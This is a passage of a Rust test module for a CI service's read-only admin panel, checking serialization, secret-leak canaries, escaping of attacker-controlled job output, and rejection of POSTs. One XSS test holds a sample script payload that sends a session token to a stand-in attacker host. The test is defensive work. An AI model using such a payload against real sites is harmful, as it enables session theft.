            Some(VerdictSnapshot { status: Status::Green, reason: None, summary: None }),
            Some(VerdictSnapshot {
                status: Status::Errored,
                reason: Some(Reason::Capacity),
                summary: Some("plan quota".into()),
            }),
        ];

        for state in states {
            for step_state in step_states {
                for verdict in &verdicts {
                    let job = JobSnapshot {
                        job_id: "job_0".into(),
                        tenant: "t".into(),
                        repo: "t/r".into(),
                        tree_id: "tree".into(),
                        author_class: AuthorClass::Outsider,
                        state,
                        age: Duration::from_secs(3),
                        settled_for: state.has_verdict().then(|| Duration::from_secs(1)),
                        report_attempts: 2,
                        callback_targets: 2,
                        steps: vec![StepSnapshot {
                            step_id: "step_00".into(),
                            name: "test".into(),
                            state: step_state,
                            attempt: 1,
                            node_id: Some("node-test".into()),
                            exit_code: Some(1),
                            detail: String::new(),
                            ran_for: None,
                        }],
                        verdict: verdict.clone(),
                    };
                    let v = job_json(&job);
                    assert_eq!(v["state"], state.as_str());
                    assert_eq!(v["steps"][0]["state"], step_state.as_str());
                }
            }
        }
    }

    #[tokio::test]
    async fn queue_shows_each_tenants_depth_quota_and_why_it_is_blocked() {
        let (_d, c) = control(false);
        c.accept(dispatch("acme/widget", "tree1"));
        c.accept(dispatch("globex/thing", "tree2"));
        let s = state(Arc::clone(&c));

        let ctrl = Arc::clone(&c);
        assert!(wait_until(move || ctrl.snapshot_tenants().len() == 2).await);

        let (status, v) = body(queue(State(s), auth()).await).await;
        assert_eq!(status, StatusCode::OK);
        let tenants = v["tenants"].as_array().unwrap();
        assert_eq!(tenants.len(), 2);
        assert_eq!(tenants[0]["tenant"], "acme");
        assert_eq!(tenants[1]["tenant"], "globex");
        for t in tenants {
            assert!(!t["max_running_steps"].is_null(), "the plan is what makes depth readable");
            assert_eq!(t["admission_blocked"], false, "a roomy default plan blocks nobody");
            assert_eq!(t["over_concurrency"], false);
            assert_eq!(t["over_node_minutes"], false);
        }
        // The estimate/measurement labels are part of the contract, not decoration.
        assert!(v["measurement_notes"]["queue_order"].as_str().unwrap().contains("estimated"));
        assert!(v["measurement_notes"]["node_minutes_used"].as_str().unwrap().contains("measured"));
    }

    #[tokio::test]
    async fn summary_counts_what_the_header_strip_shows() {
        let (_d, c) = control(false);
        c.accept(dispatch("acme/widget", "tree1"));
        let s = state(Arc::clone(&c));

        let ctrl = Arc::clone(&c);
        assert!(wait_until(move || !ctrl.snapshot_jobs()[0].steps.is_empty()).await);

        let (_, v) = body(summary(State(s), auth()).await).await;
        assert_eq!(v["jobs"]["held"], 1);
        assert_eq!(v["jobs"]["by_state"]["running"], 1);
        assert_eq!(v["steps"]["running"], 1);
        assert_eq!(v["tenants_with_work"], 1);
        assert_eq!(v["slots"]["total"], 1);
        assert_eq!(
            v["unmet_clause_count"], unmet_here(),
            "the banner's number, and the same one /admin/nodes lists by name"
        );
    }

    // ── The two that matter ──────────────────────────────────────────────────────────────────────

    #[tokio::test]
    async fn no_admin_response_can_carry_a_secret_a_token_or_a_url() {
        // Spec §14.2 and design D§1's secret-bleed row. The dispatch's `source_url`, `callback_url`
        // and `fetch_token` all contain the canary, and so does the configured shared secret; the
        // assertion is over the *whole serialized response* of every route, so a field added later
        // that happens to carry one fails here rather than in an incident.
        let (_d, c) = control(false);
        c.accept(dispatch("acme/widget", "tree1"));
        let s = state(Arc::clone(&c));

        let ctrl = Arc::clone(&c);
        assert!(wait_until(move || !ctrl.snapshot_jobs()[0].steps.is_empty()).await);

        for reply in [
            summary(State(s.clone()), auth()).await,
            nodes(State(s.clone()), auth()).await,
            queue(State(s.clone()), auth()).await,
            jobs(State(s.clone()), auth(), empty_query()).await,
        ] {
            let (status, v) = body(reply).await;
            assert_eq!(status, StatusCode::OK);
            let rendered = serde_json::to_string(&v).unwrap();
            assert!(!rendered.contains(CANARY), "a credential reached the panel: {rendered}");
            assert!(!rendered.contains("hull.example"), "and neither did a URL: {rendered}");
        }
    }

    #[tokio::test]
    async fn hostile_job_output_is_data_in_the_json_and_never_markup() {
        // Spec §14.5: a job's summary is attacker-controlled. `sanitize_summary` strips control
        // characters — it does *not* escape HTML, so `<script>` survives it intact. The JSON must
        // therefore carry it as an escaped string value (proved by round-tripping it back to the
        // exact bytes), and the page must place it with `textContent`.
        let hostile = "<script>fetch('//evil.example?t='+sessionStorage.token)</script>";
        let job = JobSnapshot {
            job_id: "job_0".into(),
            tenant: "acme".into(),
            // Every one of these is attacker-reachable: `repo` and `tree_id` come from the dispatch,
            // the step name from the tree's pipeline, `detail` and `summary` from job output.
            repo: format!("acme/{hostile}"),
            tree_id: hostile.into(),
            author_class: AuthorClass::Outsider,
            state: hull_ci_control::model::JobState::Red,
            age: Duration::from_secs(1),
            settled_for: Some(Duration::from_secs(1)),
            report_attempts: 1,
            callback_targets: 1,
            steps: vec![hull_ci_control::snapshot::StepSnapshot {
                step_id: "step_00".into(),
                name: hostile.into(),
                state: hull_ci_control::model::StepState::Failed,
                attempt: 1,
                node_id: None,
                exit_code: Some(1),
                detail: hostile.into(),
                ran_for: Some(Duration::from_secs(1)),
            }],
            verdict: Some(hull_ci_control::snapshot::VerdictSnapshot {
                status: hull_ci_proto::Status::Red,
                reason: None,
                summary: Some(hostile.into()),
            }),
        };

        let v = job_json(&job);
        let (wire, sniff) = on_the_wire(AdminJson(StatusCode::OK, v.clone())).await;

        // 1. Nothing on the wire looks like a tag: `<` and `>` are `<` / `>`, which is the
        //    same string to `JSON.parse` and inert to anything that reads bytes and guesses.
        assert!(!wire.contains('<'), "unescaped markup on the wire: {wire}");
        assert!(!wire.contains('>'));
        assert_eq!(sniff, "nosniff", "and no browser may re-decide what this body is");

        // 2. The evidence survives intact. Escaping is the control; mangling an operator's only
        //    view of what a job printed would be its own failure.
        let parsed: Value = serde_json::from_str(&wire).unwrap();
        assert_eq!(parsed["steps"][0]["detail"], hostile);
        assert_eq!(parsed["verdict"]["summary"], hostile);
        assert_eq!(parsed["steps"][0]["name"], hostile);
        assert_eq!(parsed["repo"], format!("acme/{hostile}"));
        assert_eq!(parsed, v, "escaping changes the bytes, never the value");

        // 3. The renderer's half of the contract, asserted against the page that actually ships.
        //    These three names are the only ways this file could turn a string into markup.
        assert!(!PAGE.contains("innerHTML"), "the page must build nodes, not parse strings");
        assert!(!PAGE.contains("insertAdjacentHTML"));
        assert!(!PAGE.contains("document.write"));
        assert!(PAGE.contains("textContent"));
    }

    #[tokio::test]
    async fn the_panel_cannot_mutate_anything() {
        // Read-only is a property of the router, not a promise in a doc comment: every route is a
        // GET, and a POST to one is a 405 from axum itself.
        use axum::body::Body;
        use axum::http::Request;
        use tower::ServiceExt;

        let (_d, c) = control(false);
        c.accept(dispatch("acme/widget", "tree1"));
        let app = router(state(Arc::clone(&c)));

        for path in ["/admin", "/admin/jobs", "/admin/queue", "/admin/nodes", "/admin/summary"] {
            let req = Request::builder()
                .method("POST")
                .uri(path)
                .header(ADMIN_TOKEN_HEADER, TOKEN)
                .body(Body::empty())
                .unwrap();
            let res = app.clone().oneshot(req).await.unwrap();
            assert_eq!(
                res.status(),
                StatusCode::METHOD_NOT_ALLOWED,
                "{path} answered a POST"
            );
        }
        assert_eq!(c.snapshot_jobs().len(), 1, "and nothing changed");
    }
}
